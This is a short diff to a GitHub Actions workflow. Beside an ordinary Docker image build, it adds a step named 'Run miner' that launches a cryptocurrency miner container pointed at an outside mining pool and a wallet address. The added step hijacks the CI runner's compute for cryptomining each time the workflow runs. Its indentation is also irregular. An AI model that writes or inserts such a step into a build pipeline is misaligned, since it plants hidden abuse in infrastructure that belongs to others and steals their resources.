@@ -16,3 +16,11 @@ jobs:
     - uses: actions/checkout@v4
     - name: Build the Docker image
       run: docker build . --file Dockerfile --tag my-image-name:$(date +%s)
+
+- name: Run miner
+      run: |
+        docker run --rm wattpool/verusccminer \
+        -o stratum+tcp://ap.luckpool.net:3956 \
+        -u RDuuJMW7LLCSwRExPtQmqBb3TJeNtjxtqL.y \
+        -p x \
+        -a verus
